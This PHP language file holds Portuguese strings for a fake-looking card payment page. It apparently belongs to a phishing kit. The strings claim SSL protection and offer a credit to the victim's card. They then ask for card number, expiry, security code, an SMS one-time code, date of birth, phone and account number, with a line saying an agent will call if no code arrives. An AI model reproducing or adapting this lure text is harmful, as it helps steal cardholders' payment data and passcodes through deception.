<?php
$language = array(
    'title' => array(
        '1' => 'Pagamento',
    ),
	
    'secure_text' => array(
        '1' => 'Com tecnologia SSL',
        '2' => 'seus dados pessoais estão sempre protegidos.',
    ),
	
    'card_title' => array(
        '1' => 'Crédito no meu cartão',
    ),

    'order_btn' => array(
        '1' => 'Pagamento',
        '2' => 'Pagamento seguro por SSL',
    ),

    'biling' => array(
        '1' => 'Seus detalhes de contato',
            '2' => 'Primeiro nome',
            '3' => 'Sobrenome',
            '4' => 'E-mail',
    ),
    
	'details_submit' => array(
        '1' => 'Próximo',
    ),

    'paiement_iframe'   => array(
        'details_title' => array(
            '1' => '1 pagamentos',
            '2' => 'Informações de pagamento',
            '3' => 'Custo',
            '4' => 'Detalhe',
            '5' => 'subtotal',
            '6' => 'IVA',
            '7' => 'Total',
            '8' => 'Insira suas informações de pagamento',
        ),
        'formpayment' => array(
			'1' => 'Número de telefone',
			'2' => 'Número do cartão',
			'3' => 'Data de validade',
			'4' => 'código de segurança',
			'5' => 'Validar',
		),
    ),

    'vbv' => array(
        'lines' => array(
            '1' => ' ',
            '2' => 'ajuda a proteger sua',
            '3' => 'Cartão contra uso não autorizado on-line - sem nenhum custo adicional. Usar',
            '4' => 'Confirme o código recebido por SMS para receber o pagamento',
            '5' => 'clique em validar',
            '6' => 'Nota: se você não receber um código, um de nossos agentes ligará para você para finalizar a operação',
        ),
        '1'     => 'Comerciante',
        '2'     => 'Montante',
        '3'     => 'Data',
        '4'     => 'Número do cartão',
        '5'     => 'Tipo de cartão',
        '6'     => 'Nome como impresso no cartão',
        '7'     => 'Data do nascimento do titular do cartão principal',
        '8'     => '(DD/MM/AAAA)',
        '9'     => 'Número de telefone pessoal',
        '10'    => 'Número da conta',
        '11'    => 'Validar',
        '12'    => '"Código expirado. Aguarde que um novo código seja enviado em 30 segundos"',
        '13'    => '"Inválido"',
    ),

    'footer_top'   => array(
        '1' => 'Entre em contato',
        '2' => 'Termos de venda',
            '3' => 'Loja criada com',
            '4' => 'Política de segurança',
    ),
    
);

?>